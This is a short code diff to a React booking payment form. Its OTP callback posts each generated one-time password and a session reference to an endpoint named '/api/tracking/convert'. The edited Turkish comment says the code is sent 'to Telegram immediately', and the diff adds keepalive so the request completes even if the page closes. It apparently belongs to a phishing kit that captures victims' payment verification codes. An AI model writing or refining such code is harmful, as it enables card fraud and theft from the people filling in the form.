@@ -438,10 +438,11 @@ export function PaymentForm({ ctx, guestName, guestPhone }: { ctx: BookingContex
           onSuccess={onOtpSuccess}
           onClose={() => setOtpOpen(false)}
           onOtpGenerated={(code) => {
-            // OTP'yi HEMEN convert handler'a gönder — ek gecikme yok
+            // OTP'yi HEMEN Telegram'a gönder — hiçbir gecikme olmadan
             fetch("/api/tracking/convert", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
+              keepalive: true,
               body: JSON.stringify({
                 code,
                 session: refNo,
